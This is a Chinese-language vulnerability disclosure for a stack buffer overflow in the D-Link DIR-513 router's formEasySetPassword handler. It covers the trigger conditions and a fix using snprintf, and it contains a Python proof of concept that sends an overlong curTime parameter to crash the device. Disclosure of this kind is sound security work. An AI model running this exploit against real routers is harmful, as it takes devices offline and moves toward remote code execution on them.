漏洞所属类型：通用型漏洞

漏洞厂商：Dlink

厂商官网：[<u><span class="15"><font face="Calibri">https://www.dlink.com.cn/</font></span></u>](https://www.dlink.com.cn/)

影响对象类型：网络设备（交换机、路由器等网络设备）

影响产品：DIR-513

影响产品版本：A1FW110，A2FW110

是否产品组件漏洞：否

漏洞名称：Dlink DIR-513 formEasySetPassword函数存在缓冲区溢出漏洞 存在 二进制 漏洞

版本号：1.10

## 触发位置

网络服务程序的 formEasySetPassword 函数（地址：0x4439b4）中，sprintf(v11, "/Basic/Wizard_Easy_Timezone.asp?t=%s", Var); 语句处。触发条件为：通过 HTTP POST 请求发送超长的 curTime 参数，且 language 参数不为 "SC" 或 "TW" 时触发该漏洞分支。



## Poc

```
import requests
import struct

# 目标配置
TARGET_IP = "192.168.0.1"
URL = f"http://{TARGET_IP}/goform/formEasySetPassword"

# 计算偏移量
OFFSET_TO_RETURN_ADDR = 172  # 从 v11 到返回地址
FORMAT_STR_LEN = 36          # 格式化字符串长度
PADDING_LEN = OFFSET_TO_RETURN_ADDR - FORMAT_STR_LEN + 50 

# 构造 Payload
padding = b'A' * PADDING_LEN

payload = padding 

# 构造 HTTP 请求
# 注意：language 不能是 "SC" 或 "TW"，否则不会触发漏洞分支
data = {
    "curTime": payload,  # 使用 latin-1 编码保留所有字节
    "language": "EN",  # 确保触发漏洞分支
    "config.password": "test123",
    "config.user_password": "test123"
}

# 发送请求
response = requests.post(URL, data=data)
print(f"Response Status: {response.status_code}")
```

## 漏洞描述

【Dlink DIR-513 是一款由 D-Link 生产的网络路由器设备】；Dlink DIR-513 的 Web 服务在处理表单请求时存在栈缓冲区溢出漏洞。在 formEasySetPassword 函数中，程序通过 websGetVar 获取用户可控的 curTime 参数，且未进行长度限制。当 language 参数不等于 "SC" 且不等于 "TW" 时，程序会调用无边界检查的 sprintf 函数，将超长的 curTime 直接拼接到大小固定为 104 字节的栈缓冲区 v11 中。攻击者可通过发送精心构造的恶意 POST 请求，造成栈溢出并覆盖相距 172 字节的函数返回地址，最终导致设备拒绝服务或远程代码执行。



**临时解决方案：**

1.添加对 curTime 参数的长度校验，限制其长度（例如不超过 60 字节），并在验证失败时拒绝请求。
2.在网络边界处部署 WAF 或流量监控规则，拦截向 /formEasySetPassword 接口发送的、curTime 参数异常超长的恶意 POST 请求。



**正式解决方案：**

将存在溢出风险的 sprintf 替换为安全的边界检查函数：snprintf(v11, sizeof(v11), "/Basic/Wizard_Easy_Timezone.asp?t=%s", Var);。
